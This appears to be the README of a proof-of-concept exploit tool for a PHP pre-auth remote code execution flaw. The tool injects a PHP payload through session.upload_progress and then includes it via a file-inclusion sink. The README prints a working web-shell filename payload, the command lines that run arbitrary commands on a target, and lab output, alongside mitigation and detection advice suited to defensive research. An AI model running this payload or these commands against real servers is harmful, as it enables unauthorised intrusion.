# php2shell

Proof-of-concept for **CVE-2026-109618** / **CVE-2026-109619** ("php2shell") — PHP pre-auth RCE
via `session.upload_progress` and the Zend engine OOM bailout.

> **CVSS v4.0 9.2 — Critical**
> Affected: PHP `< 8.2.35`, `< 8.3.36`, `< 8.4.27`, `< 8.5.12`
> Fixed: `8.2.35`, `8.3.36`, `8.4.27`, `8.5.12`
> Patch: [php-src@3584a98](https://github.com/php/php-src/commit/3584a98bda) — "Avoid state corruption via bailout"
> Advisories: [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w), [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)

---

## ⚠️ Disclaimer

This tool is provided **strictly for authorised security testing, incident response,
and defensive research**.

- Use it **only** against systems you own or have **explicit written permission** to test.
- Running `chainA --exec` executes arbitrary commands on the target. Unauthorised use
  is illegal under computer-misuse laws (in Indonesia: UU ITE Pasal 30–32).
- The author accepts **no liability** for misuse or damage.
- No warranty of any kind. This is not a production security product.
- If you find a vulnerable host, report it responsibly to the owner/CERT — do not
  exfiltrate data.

By using this software you confirm you have the legal right to test the target.

---

## What it does

Two subcommands:

### `check` — read-only detection
Fingerprints the PHP version and attempts to reach the OOM path during request
startup (the precondition for Chain D/E). Sends a 0.19 MB nested-variable body
derived from PHP's own regression test `Zend/tests/oom_request_parsing.phpt`.
No code is executed.

```bash
python3 php2shell.py check https://target.example/
python3 php2shell.py check https://target.example/ --vars 2000 --levels 63
```

### `chainA` — proven RCE via `session.upload_progress` + LFI
Plants a PHP payload as an **upload filename** (written verbatim into the session
file by PHP during request startup) and then includes that file through an LFI
sink.

```bash
# proof only (echo markers, no command execution)
python3 php2shell.py chainA https://target.example/ \
    --lfi-path /vuln.php --session-path /tmp

# command execution
python3 php2shell.py chainA https://target.example/ \
    --lfi-path /vuln.php --session-path /tmp --exec 'id'

# race session.upload_progress.cleanup=On (production default)
python3 php2shell.py chainA https://target.example/ \
    --lfi-path /vuln.php --session-path /var/lib/php/sessions \
    --cleanup-on --attempts 5
```

---

## Why Chain A works

`session.upload_progress.enabled` is **On by default**. During request startup —
before any application code runs — PHP parses the multipart body and stores the
upload filename verbatim in the session file:

```
upload_progress_<key>|a:5:{...s:4:"name";s:<len>:"<RAW FILENAME>";...}
```

The filename is not sanitised, so a payload such as

```
filename="<?php system($_GET['c']); ?>"
```

lands inside `/tmp/sess_<sid>`. `PHPSESSID` can also be supplied as a form field,
so the attacker controls the session file name. Any `include`/`require` sink that
accepts a user-controlled path then executes the payload.

The 8.4.27 patch adds `PS(in_rfc1867_update)` and forces "incomplete classes only"
during upload-progress decode — precisely this path.

**Chain A does not require memory corruption.** It works even on patched PHP
(verified against PHP 8.2.35). Patching PHP removes Chains D/E, not this one;
you must also disable `session.upload_progress` or remove the LFI sink.

---

## Attack chains (context)

| Chain | Vector | Pre-auth | Conditions | SAPI |
|-------|--------|:--------:|------------|------|
| A | session injection + LFI | Yes | any LFI sink | all |
| B | `var_destroy` UAF → handler overwrite | No | app calls `unserialize()` | all |
| C | handler mismatch → `__destruct` | Yes | two `serialize_handler` dirs | FPM |
| D | OOM → stale `EG()` | Yes | none (mod_php) | mod_php |
| E | FPM session OOM → stale `BG()` | Yes | any `session_start()` | FPM |

This repo implements **A** (full RCE) and detection for **D/E** preconditions.

---

## Verification

Tested against a local lab (`php:8.2-fpm` and `php:8.2-apache`) with an LFI sink:

| Command | SAPI | Result |
|---|---|---|
| `chainA` (echo only) | FPM | `PHP2SHELL_OK` |
| `chainA --exec 'id; whoami'` | FPM | `uid=33(www-data)` / `www-data` |
| `chainA --exec 'id'` | mod_php | `uid=33(www-data)` |
| `check` | mod_php 8.2.35 | `patched`, no OOM (correct) |

---

## Mitigation

1. **Disable upload progress** (fastest, near-zero legitimate use):
   ```ini
   session.upload_progress.enabled = Off
   ```
2. Patch PHP to `8.2.35` / `8.3.36` / `8.4.27` / `8.5.12` or later.
3. Remove/fix LFI sinks (`include`/`require` with user input).
4. Block `PHP_SESSION_UPLOAD_PROGRESS` in multipart bodies at the WAF.
5. Set `session.upload_progress.cleanup = On` (default) — reduces the race window
   but does not remove the flaw.

---

## Detection

Look for multipart POSTs containing `PHP_SESSION_UPLOAD_PROGRESS` where the
`filename` field contains PHP tags or shell metacharacters, followed by a GET to a
script with a file-path parameter pointing at `/tmp/sess_*` or
`/var/lib/php/sessions/sess_*`.

---

## Requirements

Python 3.8+. No third-party dependencies (stdlib only).

## License

MIT — see [LICENSE](LICENSE).
